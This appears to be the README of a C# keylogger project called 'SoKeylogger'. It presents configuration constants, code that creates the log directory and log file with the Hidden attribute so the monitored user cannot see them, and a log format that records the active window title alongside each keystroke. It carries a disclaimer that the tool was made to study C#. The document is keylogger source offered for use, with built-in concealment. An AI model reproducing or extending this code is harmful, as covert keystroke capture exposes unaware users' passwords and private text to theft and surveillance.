# SoKeylogger

#### [README_RU]()

### About

Developed using .NET framework 4.0 for greater compatibility.

The application allows you to log keystrokes on the PC.

#### The application was created in order to study C#. I am not responsible for your actions with this application and source code.

### Settings

You can configure some parameters by changing the variables in the #Settings region.

```csharp
// personal ID of this application. helps to sort log files
private static readonly string KLGR_PERS_ID = "1";
// directory path
private static readonly string DIR_PATH = @"C:\directory name";
// log file name
private static readonly string LOG_FILENAME = @"\filename" + KLGR_PERS_ID + ".txt";
// full path to log file
private static readonly string LOGFILE_FP = DIR_PATH + LOG_FILENAME;
```

### Logging

If the logging directory does not exist, it is created and it's attribute sets to "Hidden".<br/>
The user will not be able to see the folder without turning on the function of viewing hidden items in the explorer.

```csharp
if (!Directory.Exists(DIR_PATH)) {
    DirectoryInfo di = Directory.CreateDirectory(DIR_PATH);
    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
}
```

The same with log file. It is created if it does not exist and it's attribute sets to "Hidden".  

```csharp
if (!File.Exists(LOGFILE_FP)) {    
    File.Create(LOGFILE_FP);
    FileInfo fi = new FileInfo(LOGFILE_FP);
    fi.Attributes = FileAttributes.Hidden;
}
```

When the program is restarted, the log file will not be deleted. Application will add new entries to the end.<br />
The log file contains information in this condition: [Date Time][Active window caption] -> [Key]

```
[01.01.1970 00:00:00][Notepad] -> T
[01.01.1970 00:00:00][Notepad] -> E
[01.01.1970 00:00:00][Notepad] -> S
[01.01.1970 00:00:00][Notepad] -> T
[01.01.1970 00:00:00][Notepad] -> Space
[01.01.1970 00:00:00][Notepad] -> T
[01.01.1970 00:00:00][Notepad] -> H
[01.01.1970 00:00:00][Notepad] -> I
[01.01.1970 00:00:00][Notepad] -> S
```

### Known problems

- When the application is started for the first time, logging does not begin if the directory and the log file do not exist.
